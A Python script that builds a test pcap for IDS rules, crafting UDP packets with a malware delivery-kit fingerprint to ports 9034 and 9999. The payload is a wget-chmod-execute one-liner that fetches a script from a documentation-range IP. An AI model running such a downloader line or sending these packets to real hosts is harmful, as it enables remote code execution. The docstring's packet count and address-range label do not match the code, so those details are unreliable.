#!/usr/bin/env python3
"""Generate a self-test pcap: one crafted single-packet UDP delivery.

The datagram is built to trip several rules in this repo at once, so a test
run is a positive control rather than just a syntax check. It carries:

  IP ID     0xd431      the raw-socket delivery-kit fingerprint
  DF        clear       same
  TTL       232         same
  UDP cksum 0           same - "not computed", legal in IPv4
  dport     9034        Realtek SDK vector
  payload   a wget|chmod one-liner

Expected to fire:

  1000001  generic wget content
  1000005  chmod +x
  1000010  delivery-kit fingerprint
  1000011  kit + downloader composite
  1000023  downloader payload on 9034

Destination is 192.168.1.10, which must be inside HOME_NET for any of the
rules to match - they are all written '-> $HOME_NET'. If a grid's HOME_NET
excludes RFC1918 space, pass --dst with an address that is inside it.

Nothing here is malicious: the URL is in TEST-NET-3 (RFC 5737) and the
datagram is never sent anywhere, only written to a file.
"""

import argparse
import struct
import sys


def checksum16(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) | data[i + 1]
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


def ipv4(addr: str) -> bytes:
    parts = [int(p) for p in addr.split(".")]
    if len(parts) != 4 or any(p < 0 or p > 255 for p in parts):
        raise ValueError("bad IPv4 address: %s" % addr)
    return bytes(parts)


def build_packet(src: str, dst: str, sport: int, dport: int, payload: bytes) -> bytes:
    # Ethernet II
    eth = bytes.fromhex("001122334455") + bytes.fromhex("66778899aabb") + b"\x08\x00"

    # UDP. Checksum left at zero on purpose: that is part of the kit
    # fingerprint, and a zero UDP checksum is legal in IPv4 (means "not
    # computed"), so Suricata does not treat the packet as invalid.
    udp_len = 8 + len(payload)
    udp = struct.pack("!HHHH", sport, dport, udp_len, 0) + payload

    # IPv4. ID 0xd431, DF clear, TTL 232 - the delivery-kit fingerprint.
    total_len = 20 + udp_len
    ip_no_cksum = (
        struct.pack("!BBHHHBBH", 0x45, 0x00, total_len, 0xD431, 0x0000, 232, 17, 0)
        + ipv4(src)
        + ipv4(dst)
    )
    cksum = checksum16(ip_no_cksum)
    ip = ip_no_cksum[:10] + struct.pack("!H", cksum) + ip_no_cksum[12:]

    return eth + ip + udp


def write_pcap(path: str, packets: list) -> None:
    with open(path, "wb") as fh:
        # libpcap file header: LE magic, v2.4, snaplen 65535, linktype 1.
        fh.write(struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1))
        for i, pkt in enumerate(packets):
            fh.write(struct.pack("<IIII", 1700000000 + i, 0, len(pkt), len(pkt)))
            fh.write(pkt)


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("output", help="pcap file to write")
    ap.add_argument("--src", default="203.0.113.1", help="source IP (default: TEST-NET-3)")
    ap.add_argument("--dst", default="192.168.1.10",
                    help="destination IP - must be inside HOME_NET (default: 192.168.1.10)")
    args = ap.parse_args()

    payload = b"wget http://198.51.100.7/x.sh; chmod +x x.sh; ./x.sh"

    packets = [
        # Realtek vector, carrying the kit fingerprint.
        build_packet(args.src, args.dst, 41234, 9034, payload),
        # Same shape on the UDP/9999 vector, to exercise a second rule.
        build_packet(args.src, args.dst, 41235, 9999, payload),
    ]

    write_pcap(args.output, packets)
    sys.stderr.write(
        "wrote %s: %d packets, dst %s (must be inside HOME_NET)\n"
        % (args.output, len(packets), args.dst)
    )
    return 0


if __name__ == "__main__":
    sys.exit(main())
